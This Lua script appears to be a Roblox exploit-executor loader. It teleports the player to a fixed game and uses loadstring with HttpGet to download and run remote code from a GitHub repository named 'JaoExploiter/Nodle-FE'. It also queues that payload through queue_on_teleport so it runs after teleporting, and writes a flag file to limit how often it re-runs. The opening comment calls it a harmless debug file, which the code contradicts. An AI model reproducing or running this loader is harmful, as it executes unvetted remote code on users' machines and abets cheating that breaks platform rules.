-- Pls do not execute this is a debugfile
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local lp = Players.LocalPlayer or Players.PlayerAdded:Wait()
local placeId = 15396672937
local flagFile = "exec_once_"..tostring(placeId)..".flag"
local timeoutSeconds = 300

local function safe_isfile(n)
    return type(isfile) == "function" and isfile(n)
end

local function safe_writefile(n, c)
    if type(writefile) == "function" then
        pcall(writefile, n, tostring(c))
    end
end

local function safe_readfile(n)
    if type(readfile) == "function" and safe_isfile(n) then
        local ok, c = pcall(readfile, n)
        if ok then return c end
    end
    return nil
end

local function safe_delfile(n)
    if type(delfile) == "function" and safe_isfile(n) then
        pcall(delfile, n)
    end
end

local function flag_is_active()
    local content = safe_readfile(flagFile)
    local tnum = tonumber(content)
    if tnum and os.time() - tnum < timeoutSeconds then
        return true
    end
    return false
end

local function set_flag()
    safe_writefile(flagFile, tostring(os.time()))
end

if game.PlaceId == placeId then
    if flag_is_active() then return end
    if type(loadstring) == "function" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JaoExploiter/Nodle-FE/refs/heads/main/Source.lua"))()
    end
    set_flag()
    return
end

if flag_is_active() then return end

local payload = ([[
if type(isfile)=="function" and isfile("%s") and type(readfile)=="function" then
    local c=readfile("%s")
    local t=tonumber(c)
    if t and os.time()-t < %d then return end
end
if type(loadstring)=="function" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JaoExploiter/Nodle-FE/refs/heads/main/Source.lua"))()
end
if type(writefile)=="function" then writefile("%s",tostring(os.time())) end
]]):format(flagFile, flagFile, timeoutSeconds, flagFile)

local queue = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
if queue then
    queue(payload)
end

local ok, err = pcall(function()
    TeleportService:Teleport(placeId, lp)
end)

if not ok then
    warn("Teleport failed: " .. tostring(err))
    pcall(function()
        setclipboard("https://www.roblox.com/games/"..tostring(placeId))
    end)
    warn("Game link copied to clipboard. Join manually.")
end
